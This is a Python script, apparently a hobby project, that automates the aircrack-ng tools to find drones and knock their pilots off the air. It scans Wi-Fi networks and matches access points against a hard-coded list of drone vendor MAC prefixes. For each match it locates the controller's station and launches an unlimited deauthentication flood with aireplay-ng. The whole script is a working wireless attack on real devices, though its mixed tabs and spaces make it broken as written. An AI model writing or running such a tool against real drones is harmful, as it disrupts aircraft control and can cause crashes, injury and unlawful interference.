#!/usr/bin/env python
import subprocess
import csv
import os
import time

class HackingDrones:
    """Trying to hack drones and cool stuff. This automates the process using the aircrack modules"""
    def __init__(self, known_ips, dirc = os.getcwd()):
        """The init method instantiates the known list of ips to track. It also runs the full automation process."""
        self.known_ips = known_ips
        os.chdir(dirc)
        self.matched_ips = dict()   #Format for this dictionary is potential matches' {IP: [channel, name]}
        self.start()		    #This functions results in a outputted csv file of network information 
        self.identification()
        self.kill(self.matched_ips)
        self.clean_up(["output-01.csv"])

    def run_bash(self, cmd):
        """This function allows the python script to execute bash commands"""
        subprocess.call("{}".format(cmd), shell=True)
        
    def start(self):
        """This method scans for Wifi networks and outputs them as a csv file to the desktop.
	   The user only has to enact the Keyboard interrupt to stop the scanning when desired."""
        self.run_bash("echo Disconnecting from wifi networks")
        time.sleep(1)
        self.run_bash("airmon-ng")
        time.sleep(1)
        self.run_bash("echo Enabling Monitor Mode")
        time.sleep(1)
        self.run_bash("airmon-ng start wlan0mon")
        self.run_bash("echo Scanning for local network, hit the Keyboard Interrupt 'ctrl+C' to stop scanning")
        time.sleep(1)
        try:
	        self.run_bash("airodump-ng wlan0 -w output --output-format csv")
        except KeyboardInterrupt:
	        self.run_bash("killall airodump-ng")
    
    def read_files(self, file_name, expected_num_values, desired_start, separator = ", "):
        """A generic read file generator to check bad file inputs and read line by line"""
        try:
            fp = open(file_name, 'rb') 
        except FileNotFoundError: 
            raise FileNotFoundError ("Could not open {}".format(file_name))
        else:
            with fp:
                x = 0
                for line in fp:
                    if x > desired_start:
                        st_line = str(line)
                        l = st_line.strip().split(separator)
                        if len(l) == expected_num_values:
                            yield l
                    x += 1

    def identification(self):
        """This function takes the information from the generator and then attempts to identify if a 
        returned IP is a known drone IP, it then compiles a dictionary of matched IP's"""
        read_network_ips = self.read_files("output-01.csv", 14, 1, separator = ", ")
        for bssid, first_time_seen, last_time_seen, channel, speed, privacy, cipher, authentication,\
            power, beacons, IV, LAN, en, name in read_network_ips:
            if bssid[:8] in self.known_ips:
                print("Match found at this IP: {}".format(bssid))
                self.matched_ips[bssid] = [channel.strip(), name[:-1]]
        print("Here are all the drone IP's: {}".format(self.matched_ips))
        return None

    def kill(self, kill_list):
	"""This deauths the drones"""
	for bssid in self.matched_ips.keys():
	    self.run_bash("echo Accessing network:")
	    station = ""
	    try:
	        self.run_bash("airodump-ng -c {} --bssid {} -w /root/Desktop/ wlan0".format(self.matched_ips[bssid][0], bssid))
	    except KeyboardInterrupt:
	        self.run_bash("killall airodump-ng")
	    find_station = self.read_files("-01.csv", 6, 4, separator = ", ")
        for stat, first_time_seen, last_time_seen, power, num_packets, bssid_1 in find_station:
	    	station=stat
	    print(station, bssid)
	    self.run_bash("echo Deautheticating pilot:")
	    time.sleep(1)
	    try:
		    self.clean_up(["-01.csv", "-01.kismet.netxml", "-01.cap", "-01.kismet.csv"])
	        self.run_bash("aireplay-ng -0 0 -a {} -c {} wlan0".format(bssid, station))
	    except KeyboardInterrupt:
		    self.run_bash("killall aireplay-ng")
	return None


    def clean_up(self, remove_list):
        """This function deletes the scan results and other output files to prepare for the next 
        run-through of the script."""
        for file_to_remove in remove_list:
	    try:
      	    os.remove(file_to_remove)
	    except OSError:
		    print("No drones IPS were found, so {} was never created and can't  be deleted!".format(file_to_remove))
	return None

def main():
    """This is where we run the program to check for known IPs"""
    known_ips = set(["90:3A:E6", "90:03:B7", "A0:14:3D", "00:26:7E", "00:12:1C"])    #18:64:72 use this Ip(Steven's network) to test identification is working, DO NOT attempt to deauth any devices on this IP
    hacking_drones = HackingDrones(known_ips)

if __name__ == "__main__":
    main()
